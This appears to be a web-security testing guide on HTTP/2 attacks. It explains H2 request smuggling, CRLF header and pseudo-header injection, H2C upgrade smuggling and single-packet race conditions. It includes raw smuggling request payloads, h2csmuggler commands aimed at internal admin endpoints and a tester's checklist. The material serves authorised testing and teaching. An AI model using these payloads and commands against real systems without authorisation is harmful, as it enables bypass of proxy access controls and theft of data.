HTTP/2 Attacks
HTTP/2 introduced binary framing, multiplexing, and header compression  -  but the security implications are still catching up with adoption. Most web infrastructure downgrades H2 to HTTP/1.1 at the reverse proxy, and that translation layer is where the bugs live. H2 request smuggling, H2C smuggling, and single-packet race conditions are all distinct attack classes that most testers miss because their tools default to HTTP/1.1. James Kettle's research at PortSwigger demonstrated that H2 smuggling is often more reliable than classic HTTP/1.1 smuggling because the binary framing removes ambiguity that defenses rely on.
H2 Request Smuggling
When a front-end speaks HTTP/2 and downgrades to HTTP/1.1 for the backend, the translation can introduce smuggling opportunities. In HTTP/2, the Content-Length and Transfer-Encoding headers are technically not needed (the binary framing handles message boundaries), but many implementations still forward them during downgrade.

H2 CL Desync
HTTP/2 uses the binary frame length for message boundaries, not Content-Length. But during downgrade, the front-end may forward a Content-Length header that disagrees with the actual body:
POST / HTTP/2
Host: target.com
Content-Length: 0
 
GET /admin HTTP/1.1
Host: target.com
The front-end sees an H2 request with a complete body (framing says the message includes everything). During downgrade, it forwards Content-Length: 0 to the backend. The backend reads 0 bytes of body, treats the rest as the start of a new request  -  the smuggled GET /admin.
H2 TE Desync
POST / HTTP/2
Host: target.com
Transfer-Encoding: chunked
 
0
 
GET /admin HTTP/1.1
Host: target.com
HTTP/2 technically forbids Transfer-Encoding (except for trailers), but many front-ends pass it through during downgrade without stripping it.
Testing with Burp

In Burp Repeater, enable HTTP/2 mode (Inspector panel > Protocol > HTTP/2)
Send a normal request and confirm the target speaks H2
Add conflicting Content-Length or Transfer-Encoding headers
Watch for response anomalies: getting someone else's response, unexpected 404s, or duplicate headers from another user's request
Use Burp's HTTP Request Smuggler extension for automated detection

H2 Header Injection
HTTP/2's binary format means header values can contain bytes that would be invalid in HTTP/1.1. If an H2 header value contains CRLF bytes, they become actual line breaks during downgrade  -  injecting entirely new headers.
For example, the attacker sends an H2 request with a Foo header whose value contains embedded CRLF followed by Transfer-Encoding: chunked. The front-end forwards it. After downgrade, the backend sees:
GET / HTTP/1.1
Host: target.com
Foo: bar
Transfer-Encoding: chunked
The backend now has a Transfer-Encoding header that was never sent by the client  -  it was injected via the CRLF in the H2 header value. This can enable request smuggling, response splitting, or cache poisoning.
Pseudo-Header Manipulation
HTTP/2 pseudo-headers map to the HTTP/1.1 request line during downgrade. If the proxy doesn't sanitize pseudo-header values, you can inject CRLF sequences that split into multiple requests on the backend.
Injection via method: set the H2 method pseudo-header to a value containing CRLF and a second request. After downgrade, the backend sees:
GET / HTTP/1.1
Host: attacker.com
 
GET /target-page HTTP/1.1
Host: target.com
Injection via path: same concept, but the CRLF payload is in the path pseudo-header. The backend receives:
GET / HTTP/1.1
Host: target.com
 
GET /admin HTTP/1.1
Host: target.com
H2C Smuggling
H2C (HTTP/2 Cleartext) is HTTP/2 without TLS, initiated via an Upgrade header on an HTTP/1.1 connection. Reverse proxies often don't understand H2C upgrades and pass them through to the backend:
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
If the reverse proxy forwards this to an internal service that supports H2C:

The proxy establishes a tunnel (like a WebSocket upgrade)
All subsequent traffic goes directly to the backend
The proxy's access controls, WAF rules, and auth checks are bypassed

Testing with h2csmuggler
# Test if H2C upgrade is possible through the proxy
h2csmuggler detect target.com
 
# Smuggle a request to an internal endpoint
h2csmuggler request target.com /internal/admin
 
# Test multiple paths
h2csmuggler request target.com /api/internal/users
h2csmuggler request target.com /server-status
h2csmuggler request target.com /actuator/env
Single-Packet Race Conditions
HTTP/2 multiplexing lets you send multiple requests in a single TCP packet. This eliminates network jitter and creates extremely precise race conditions:
Traditional race condition:
  Request 1 ----[network jitter]----> Server
  Request 2 --------[jitter]-------> Server
  Timing varies by milliseconds
 
HTTP/2 single-packet attack:
  [Request 1 + Request 2 + Request 3] ----> Server
  All arrive in the exact same TCP packet
  Server processes them near-simultaneously
Testing with Burp

Open multiple tabs in Repeater, each with a request to send
Select all tabs, right-click > "Send group (single packet attack)"
Burp sends all requests multiplexed in one TCP segment
Useful for: coupon reuse, double-spending, limit bypass, TOCTOU bugs

This technique applies to any race condition test, but HTTP/2 makes it reliable instead of probabilistic.
ALPN and Protocol Confusion
Application-Layer Protocol Negotiation (ALPN) during TLS handshake determines whether the connection speaks HTTP/1.1 or HTTP/2. Mismatches between what the client negotiates and what the server expects can cause:

Protocol confusion leading to request interpretation errors
Downgrade attacks forcing HTTP/1.1 when H2 would have been safer
Backend services expecting one protocol but receiving another after proxy translation

Test by explicitly setting ALPN in your client:
# Force HTTP/2 via curl
curl --http2 -v target.com
 
# Force HTTP/1.1 when server supports H2
curl --http1.1 -v target.com
 
# Check what ALPN the server negotiates
openssl s_client -connect target.com:443 -alpn h2,http/1.1
Checklist

 Confirm the target supports HTTP/2 (check ALPN, :status pseudo-header in response)
 Test H2 request smuggling: send H2 request with conflicting CL or TE headers
 Test H2 header injection: embed \r\n in H2 header values
 Test pseudo-header manipulation (:method, :path with injected content)
 Test H2C smuggling: send Upgrade: h2c and attempt to reach internal endpoints
 Run h2csmuggler against the target to detect H2C upgrade support
 Test single-packet race conditions for any TOCTOU or limit-bypass scenarios
 Check for protocol downgrade: does the infrastructure translate H2 to H1.1?
 If downgrade exists: test all classic smuggling vectors through the H2 front-end
 Test with Burp's HTTP Request Smuggler extension in H2 mode
